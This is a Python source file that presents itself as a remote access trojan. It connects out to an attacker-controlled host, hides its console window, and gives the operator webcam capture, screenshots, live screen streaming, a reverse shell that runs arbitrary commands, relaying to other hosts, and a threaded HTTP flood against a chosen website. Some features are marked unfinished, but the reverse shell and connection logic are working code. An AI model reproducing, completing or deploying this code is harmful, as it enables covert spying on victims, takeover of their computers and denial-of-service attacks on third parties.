#!/usr/bin/env python3
import cv2
import pyautogui
import socket
import time
import threading
import subprocess
import os
import keyboard
import io
import ctypes
import requests

"""
		**** This RAT Was Made By Theo Kershaw ****
"""

# In the making... Getting tested...

r = "\033[31m"
w = "\033[37m"
b = "\033[34m"
g = "\033[32m"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = 'The Attacker IP Address' # Replace this
port = 1337 # Replace this
address = (host, port)
threads = []

try:
    s.connect(address)
except (ConnectionRefusedError, ConnectionError):
    time.sleep(1)

def hide_window():
    try:
        ctypes.windll.kernel32.FreeConsole()
    except Exception:
        pass

def capture_camera():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("camera.png", frame)
        _, buffer = cv2.imencode(".png", frame)
        s.send(buffer.tobytes())
    cam.release()

def capture_screen():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    with open("screen.png", "rb") as f:
        s.send(f.read())

def screen_share():
    while True:
        screenshot = pyautogui.screenshot()
        byte_io = io.BytesIO()
        screenshot.save(byte_io, format="PNG")
        image_data = byte_io.getvalue()
        s.sendall(len(image_data).to_bytes(4, byteorder="big"))
        s.sendall(image_data)
        time.sleep(0.1)

def connect_to_other_host():
    try:
        s.send('Enter IP: '.encode())
        dataip = s.recv(1024).decode().strip()
        s.send('Enter Port: '.encode())
        dataport = s.recv(1024).decode().strip()
        s.close()
        s.connect((dataip, int(dataport)))
        s.send(f'Client connected to {dataip}:{dataport}\n'.encode())
        time.sleep(1)
        handle_client(s)
    except:
        s.send(f'{r}[!]{w} Error!'.encode())
    finally:
        s.close()

def reverse_shell():
    while True:
        s.send(f"{b}[TK]{b}-{b}[Reverse Shell]{w}:> ".encode())
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command[:2] == "cd":
            try:
                path = command[3:].strip()
                os.chdir(path)
            except FileNotFoundError:
                s.send(b"Directory not found\n")
            except Exception as e:
                s.send(f"Error: {e}\n".encode())
            continue
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        s.send(output.stdout.encode() + output.stderr.encode())

def dos_main():
    s.send(f'{b}[+]{w} Enter target site (Ex. https://example.com): '.encode())
    data = s.recv(1024)
    s.send(f'{b}[*] {w}Dossing {data.decode()}...'.encode())

    def client_dos():
        time.sleep(1)
        while True:
            r = requests.get(data.decode())
            s.send(f'{b}[+] {w}Sent Packet...'.encode())

    for _ in range(200):
        thread = threading.Thread(target=client_dos)
        threads.append(thread)
        thread.start()

def handle_client(s):
    s.send(f'{b}[+] {w}Client connected, type help for menu...\n'.encode())
    while True:
        hide_window()
        try:
            s.send(f'{b}[+] {w}Tk > '.encode())
            data = s.recv(1024).decode().strip()

            if not data:
                break

            if data == 'camshot':
                capture_camera()
            elif data == 'screenshot':
                capture_screen()
            elif data == 'shell':
                reverse_shell()
            elif data == 'screenshare':
                screen_share()
            elif data == 'help':
                s.send(f'''{b}
    [***] {w}Script made by Theo Kershaw!\n
    help - Show this menu
    camshot - Capture shot from camera (Not Finished)
    screenshot - Capture shot from screen (Not Finished)
    screenshare - Start sharing screen (Not Finished)
    shell - Go into client's command line
    conntoh - Connect client to another host (Not Finished) (Note: You will lose current connection!)
    dos - Use connected client to DOS (Requests only) (500 Requests BTW) (Not Finished + Doesnt Work Yet!)
    exit - Leave
                \n'''.encode())
            elif data == 'exit':
                break
            elif data == 'conntoh':
                connect_to_other_host()
            elif data == 'dos':
                dos_main()
            else:
                s.send(f'{r}[!] {w}Invalid Option!\n'.encode())
                time.sleep(1)
        except (ConnectionResetError, BrokenPipeError):
            time.sleep(1)
            return

if __name__ == "__main__":
    handle_client(s)
